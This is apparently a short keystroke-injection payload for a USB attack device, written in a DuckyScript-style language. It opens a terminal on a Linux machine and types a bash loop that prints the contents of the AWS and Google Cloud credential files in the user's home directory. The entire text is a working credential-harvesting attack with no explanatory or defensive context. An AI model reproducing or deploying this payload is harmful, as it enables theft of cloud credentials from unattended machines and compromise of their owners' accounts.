REM Print cloud credentials
ATTACKMODE HID STORAGE
DELAY 2000
CTRL ALT t
DELAY 1000
STRING cloud_files=( ~/.aws/credentials ~/.config/gcloud/credentials.db ~/.gcloud/active_config )
ENTER
STRING for file in "${cloud_files[@]}"; do [ -f "$file" ] && echo -e "\n=== $file ===" && cat "$file"; done
ENTER